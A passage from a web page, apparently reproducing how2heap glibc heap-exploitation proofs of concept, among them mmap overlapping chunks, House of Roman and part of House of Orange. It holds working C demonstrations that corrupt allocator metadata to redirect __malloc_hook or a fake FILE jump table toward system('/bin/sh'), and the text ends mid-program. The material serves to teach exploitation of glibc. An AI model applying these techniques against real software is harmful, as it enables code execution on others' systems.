	puts(&quot;Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid&quot;); 
	puts(&quot;size and remove it from the bin.&quot;);
	puts(&quot;With this, we have pulled out an arbitrary chunk!&quot;);

	printf(&quot;String before: %s\n&quot;, target);
	printf(&quot;String pointer: %p\n&quot;, target);
	
	ptr &#x3D; malloc(alloc_size);
	strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);
	
	printf(&quot;String after %s\n&quot;, target);
	printf(&quot;Fake chunk ptr: %p\n&quot;, ptr);

	return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="mmap-overlapping-chunks-x2F-mmap"><a href="#mmap-overlapping-chunks-x2F-mmap" class="headerlink" title="mmap_overlapping_chunks&#x2F;mmap"></a>mmap_overlapping_chunks&#x2F;mmap</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;assert.h&gt;

&#x2F;*
Technique should work on all versions of GLibC
Compile: &#96;gcc mmap_overlapping_chunks.c -o mmap_overlapping_chunks -g&#96;
POC written by POC written by Maxwell Dulin (Strikeout) 
*&#x2F;
int main()&#123;


	int* ptr1 &#x3D; malloc(0x10); 

	printf(&quot;This is performing an overlapping chunk attack but on extremely large chunks (mmap chunks).\n&quot;);
	printf(&quot;Extremely large chunks are special because they are allocated in their own mmaped section\n&quot;);
	printf(&quot;of memory, instead of being put onto the normal heap.\n&quot;);
	puts(&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot;);
	printf(&quot;Allocating three extremely large heap chunks of size 0x100000 \n\n&quot;);
		
	long long* top_ptr &#x3D; malloc(0x100000);
	printf(&quot;The first mmap chunk goes directly above LibC: %p\n&quot;,top_ptr);

	&#x2F;&#x2F; After this, all chunks are allocated downwards in memory towards the heap.
	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
	printf(&quot;The second mmap chunk goes below LibC: %p\n&quot;, mmap_chunk_2);

	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
	printf(&quot;The third mmap chunk goes below the second mmap chunk: %p\n&quot;, mmap_chunk_3);

	printf(&quot;\nCurrent System Memory Layout \n&quot; \
&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n&quot; \
&quot;running program\n&quot; \
&quot;heap\n&quot; \
&quot;....\n&quot; \
&quot;third mmap chunk\n&quot; \
&quot;second mmap chunk\n&quot; \
&quot;LibC\n&quot; \
&quot;....\n&quot; \
&quot;ld\n&quot; \
&quot;first mmap chunk\n&quot;
&quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\n\n&quot; \
);
	
	printf(&quot;Prev Size of third mmap chunk: 0x%llx\n&quot;, mmap_chunk_3[-2]);
	printf(&quot;Size of third mmap chunk: 0x%llx\n\n&quot;, mmap_chunk_3[-1]);

	printf(&quot;Change the size of the third mmap chunk to overlap with the second mmap chunk\n&quot;);	
	printf(&quot;This will cause both chunks to be Munmapped and given back to the system\n&quot;);
	printf(&quot;This is where the vulnerability occurs; corrupting the size or prev_size of a chunk\n&quot;);

	&#x2F;&#x2F; Vulnerability!!! This could be triggered by an improper index or a buffer overflow from a chunk further below.
	&#x2F;&#x2F; Additionally, this same attack can be used with the prev_size instead of the size.
	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
	printf(&quot;New size of third mmap chunk: 0x%llx\n&quot;, mmap_chunk_3[-1]);
	printf(&quot;Free the third mmap chunk, which munmaps the second and third chunks\n\n&quot;);

	free(mmap_chunk_3); 

	printf(&quot;Get a very large chunk from malloc to get mmapped chunk\n&quot;);
	printf(&quot;This should overlap over the previously munmapped&#x2F;freed chunks\n&quot;);
	long long* overlapping_chunk &#x3D; malloc(0x300000);
	printf(&quot;Overlapped chunk Ptr: %p\n&quot;, overlapping_chunk);
	printf(&quot;Overlapped chunk Ptr Size: 0x%llx\n&quot;, overlapping_chunk[-1]);

	&#x2F;&#x2F; Gets the distance between the two pointers.
	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
	printf(&quot;Distance between new chunk and the second mmap chunk (which was munmapped): 0x%x\n&quot;, distance);
	printf(&quot;Value of index 0 of mmap chunk 2 prior to write: %llx\n&quot;, mmap_chunk_2[0]);
	
	&#x2F;&#x2F; Set the value of the overlapped chunk.
	printf(&quot;Setting the value of the overlapped chunk\n&quot;);
	overlapping_chunk[distance] &#x3D; 0x1122334455667788;

	&#x2F;&#x2F; Show that the pointer has been written to.
	printf(&quot;Second chunk value (after write): 0x%llx\n&quot;, mmap_chunk_2[0]);
	printf(&quot;Overlapped chunk value: 0x%llx\n\n&quot;, overlapping_chunk[distance]);
	printf(&quot;Boom! The new chunk has been overlapped with a previous mmaped chunk\n&quot;);
	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE     &#x2F;* for RTLD_NEXT *&#x2F;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;dlfcn.h&gt;

char* shell &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;;

&#x2F;* 
Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.
Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman
POC written by Maxwell Dulin (Strikeout) 
*&#x2F;

&#x2F;&#x2F; Use this in order to turn off printf buffering (messes with heap alignment)
void* init()&#123;
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
&#125;


int main()&#123;


	char* introduction &#x3D; &quot;\nWelcome to the House of Roman\n\n&quot;
			     &quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;
			     &quot;There are three stages to the attack: \n\n&quot;
			     &quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;
			     &quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;
			     &quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;
			     &quot;All of the stuff mentioned above is done using two main concepts:\n&quot;
                             &quot;relative overwrites and heap feng shui.\n\n&quot;
			     &quot;However, this technique comes at a cost:\n&quot;
                             &quot;12-bits of entropy need to be brute forced.\n&quot;
			     &quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;
			     &quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;;
	puts(introduction);	
	init();


	puts(&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;);
	puts(&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;);

	&#x2F;&#x2F; Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.	
	uint8_t* fastbin_victim &#x3D; malloc(0x60); 

	&#x2F;&#x2F; Allocate this in order to have good alignment for relative 
	&#x2F;&#x2F; offsets later (only want to overwrite a single byte to prevent 
	&#x2F;&#x2F; 4 bits of brute on the heap).
	malloc(0x80);

	&#x2F;&#x2F; Offset 0x100
	uint8_t* main_arena_use &#x3D; malloc(0x80);
	
	&#x2F;&#x2F; Offset 0x190
	&#x2F;&#x2F; This ptr will be used for a relative offset on the &#39;main_arena_use&#39; chunk
	uint8_t* relative_offset_heap &#x3D; malloc(0x60);
	
	&#x2F;&#x2F; Free the chunk to put it into the unsorted_bin. 
	&#x2F;&#x2F; This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.
	free(main_arena_use);
	

	&#x2F;* 
	Get part of the unsorted_bin chunk (the one that we just freed). 
	We want this chunk because the fd and bk of this chunk will 
	contain main_arena ptrs (used for relative overwrite later).
	The size is particularly set at 0x60 to put this into the 0x70 fastbin later. 
	This has to be the same size because the __malloc_hook fake 
	chunk (used later) uses the fastbin size of 0x7f. There is
	 a security check (within malloc) that the size of the chunk matches the fastbin size.
	*&#x2F;

	puts(&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;);
&#x2F;&#x2F;Offset 0x100. Has main_arena + 0x68 in fd and bk.
	uint8_t* fake_libc_chunk &#x3D; malloc(0x60);

	&#x2F;&#x2F;&#x2F;&#x2F; NOTE: This is NOT part of the exploit... \\\
	&#x2F;&#x2F; The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
	long long __malloc_hook &#x3D; ((long*)fake_libc_chunk)[0] - 0xe8;


	&#x2F;&#x2F; We need the filler because the overwrite below needs 
	&#x2F;&#x2F; to have a ptr in the fd slot in order to work. 
	&#x2F;&#x2F;Freeing this chunk puts a chunk in the fd slot of &#39;fastbin_victim&#39; to be used later. 
	free(relative_offset_heap);	

    	&#x2F;* 
    	Create a UAF on the chunk. Recall that the chunk that fastbin_victim 
	points to is currently at the offset 0x190 (heap_relative_offset).
     	*&#x2F;
	free(fastbin_victim);




	puts(&quot;\
Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
to the chunk with the LibC address\n&quot;);
	puts(&quot;\
Fastbin 0x70 now looks like this:\n\
heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;);
	fastbin_victim[0] &#x3D; 0x00; &#x2F;&#x2F; The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.


puts(&quot;\
Use a relative overwrite on the main_arena pointer in the fastbin.\n\
Point this close to __malloc_hook in order to create a fake fastbin chunk\n&quot;);
	long long __malloc_hook_adjust &#x3D; __malloc_hook - 0x23; &#x2F;&#x2F; We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.

	&#x2F;&#x2F; The relative overwrite
	int8_t byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	int8_t byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 
	fake_libc_chunk[0] &#x3D; byte1; &#x2F;&#x2F; Least significant bytes of the address.
	fake_libc_chunk[1] &#x3D; byte2; &#x2F;&#x2F; The upper most 4 bits of this must be brute forced in a real attack.

	&#x2F;&#x2F; Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
	&#x2F;&#x2F; These are fastbin_victim and fake_libc_chunk.
	puts(&quot;Get the fake chunk pointing close to __malloc_hook\n&quot;);
	puts(&quot;\
In a real exploit, this would fail 15&#x2F;16 times\n\
because of the final half byet of the malloc_hook being random\n&quot;);	
	malloc(0x60);
	malloc(0x60);

	&#x2F;&#x2F; If the 4 bit brute force did not work, this will crash because 
	&#x2F;&#x2F; of the chunk size not matching the bin for the chunk. 
	&#x2F;&#x2F; Otherwise, the next step of the attack can begin.
	uint8_t* malloc_hook_chunk &#x3D; malloc(0x60);	

	puts(&quot;Passed step 1 &#x3D;)\n\n\n&quot;);


	puts(&quot;\
Start Step 2: Unsorted_bin attack\n\n\
The unsorted bin attack gives us the ability to write a\n\
large value to ANY location. But, we do not control the value\n\
This value is always main_arena + 0x68. \n\
We point the unsorted_bin attack to __malloc_hook for a \n\
relative overwrite later.\n&quot;);


	&#x2F;&#x2F; Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.
	
	uint8_t* unsorted_bin_ptr &#x3D; malloc(0x80);	
	malloc(0x30); &#x2F;&#x2F; Don&#39;t want to consolidate

	puts(&quot;Put chunk into unsorted_bin\n&quot;);
	&#x2F;&#x2F; Free the chunk to create the UAF
	free(unsorted_bin_ptr);

	&#x2F;* &#x2F;&#x2F;&#x2F; NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
	 However, for the sake of example, this has been calculated dynamically. 
	*&#x2F;
	__malloc_hook_adjust &#x3D; __malloc_hook - 0x10; &#x2F;&#x2F; This subtract 0x10 is needed because of the chunk-&gt;fd doing the actual overwrite on the unsorted_bin attack.
	byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 


	&#x2F;&#x2F; Use another relative offset to overwrite the ptr of the chunk-&gt;bk pointer.
	&#x2F;&#x2F; From the previous brute force (4 bits from before) we 
	&#x2F;&#x2F; know where the location of this is at. It is 5 bytes away from __malloc_hook.
	puts(&quot;Overwrite last two bytes of the chunk to point to __malloc_hook\n&quot;);
	unsorted_bin_ptr[8] &#x3D; byte1; &#x2F;&#x2F; Byte 0 of bk. 	

	&#x2F;&#x2F; &#x2F;&#x2F;&#x2F;&#x2F; NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. &#x2F;&#x2F;&#x2F;
	unsorted_bin_ptr[9] &#x3D; byte2; &#x2F;&#x2F; Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.
	


	puts(&quot;Trigger the unsorted_bin attack\n&quot;);
	malloc(0x80); &#x2F;&#x2F; Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68

	long long system_addr &#x3D; (long long)dlsym(RTLD_NEXT, &quot;system&quot;);

	puts(&quot;Passed step 2 &#x3D;)\n\n\n&quot;);

	puts(&quot;Step 3: Set __malloc_hook to system&#x2F;one_gadget\n\n&quot;);
	puts(&quot;\
Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
we can use a relative overwrite to point this to system or a one_gadget.\n\
Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
comes from.\n&quot;);
	malloc_hook_chunk[19] &#x3D; system_addr &amp; 0xff; &#x2F;&#x2F; The first 12 bits are static (per version).

	malloc_hook_chunk[20] &#x3D; (system_addr &gt;&gt; 8) &amp; 0xff;  &#x2F;&#x2F; The last 4 bits of this must be brute forced (done previously already).
	malloc_hook_chunk[21] &#x3D; (system_addr &gt;&gt; 16) &amp; 0xff;  &#x2F;&#x2F; The last byte is the remaining 8 bits that must be brute forced.
	malloc_hook_chunk[22] &#x3D; (system_addr &gt;&gt; 24) &amp; 0xff; &#x2F;&#x2F; If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.

	puts(&quot;Pop Shell!&quot;);
	malloc((long long)shell);
		
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h1><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys&#x2F;syscall.h&gt;

&#x2F;*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http:&#x2F;&#x2F;4ngelboy.blogspot.com&#x2F;2016&#x2F;10&#x2F;hitcon-ctf-qual-2016-house-of-orange.html
*&#x2F;

&#x2F;*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*&#x2F;
int winner ( char *ptr);

int main()
&#123;
    &#x2F;*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page
      If the size requested is smaller than 0x21000, then the former is followed.
    *&#x2F;

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;
        &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;);
  
    fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;
        &quot;https:&#x2F;&#x2F;sourceware.org&#x2F;git&#x2F;?p&#x3D;glibc.git;a&#x3D;commit;h&#x3D;db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;);

    &#x2F;*
      Firstly, lets allocate a chunk on the heap.
    *&#x2F;

    p1 &#x3D; malloc(0x400-16);

    &#x2F;*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we&#39;ve allocate a chunk of size 0x400 already,
       what&#39;s left is 0x20c00 with the PREV_INUSE bit set &#x3D;&gt; 0x20c01.
       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.
       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk&#39;s prev_inuse bit has to be set.
       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What&#39;s left is 0x20c01
       Now, let&#39;s satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk&#39;s prev_inuse bit has to be set.
    *&#x2F;

    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] &#x3D; 0xc01;

    &#x2F;* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.
       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end
       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.
       After the size of the Top chunk has been updated, this chunk gets freed.
       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end
       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free
       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end
    *&#x2F;

    p2 &#x3D; malloc(0x1000);
    &#x2F;*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap&#39;s end
      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk&#39;s size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)
      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.
      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.
      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;&#x2F;bin&#x2F;sh&#39;, so
      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;&#x2F;bin&#x2F;sh&#39;).
      More about file-pointer exploitation can be found here:
      https:&#x2F;&#x2F;outflux.net&#x2F;blog&#x2F;archives&#x2F;2011&#x2F;12&#x2F;22&#x2F;abusing-the-file-structure&#x2F;
      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc&#39;s main_arena.
    *&#x2F;

    io_list_all &#x3D; top[2] + 0x9a8;

    &#x2F;*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.
      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list
      in libc&#39;s main_arena.
      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.
      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.
      So, we should set chunk-&gt;bk to be _IO_list_all - 16
    *&#x2F;
 
    top[3] &#x3D; io_list_all - 0x10;

    &#x2F;*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with &#x2F;bin&#x2F;sh, it is equivalent to system(&#x2F;bin&#x2F;sh)
    *&#x2F;

    memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);

    &#x2F;*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc&#39;s bin organisation
      see: https:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;02&#x2F;10&#x2F;understanding-glibc-malloc&#x2F;
      Since we overflow the old top chunk, we also control it&#39;s size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer&#39;s fd-ptr.
      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE &quot;size &lt;&#x3D; 2 * SIZE_SZ&quot;
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;malloc&#x2F;malloc.c.html#3717
    *&#x2F;

    top[1] &#x3D; 0x61;

    &#x2F;*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;libio&#x2F;genops.c.html#813
      We want to satisfy the first condition:
      fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    *&#x2F;

    FILE *fp &#x3D; (FILE *) top;


    &#x2F;*
      1. Set mode to 0: fp-&gt;_mode &lt;&#x3D; 0
    *&#x2F;

    fp-&gt;_mode &#x3D; 0; &#x2F;&#x2F; top+0xc0


    &#x2F;*
      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    *&#x2F;

    fp-&gt;_IO_write_base &#x3D; (char *) 2; &#x2F;&#x2F; top+0x20
    fp-&gt;_IO_write_ptr &#x3D; (char *) 3; &#x2F;&#x2F; top+0x28


    &#x2F;*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) &#x3D; jump_table
         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 &#x3D;&#x3D; winner
    *&#x2F;

    size_t *jump_table &#x3D; &amp;top[12]; &#x2F;&#x2F; controlled memory
    jump_table[3] &#x3D; (size_t) &amp;winner;
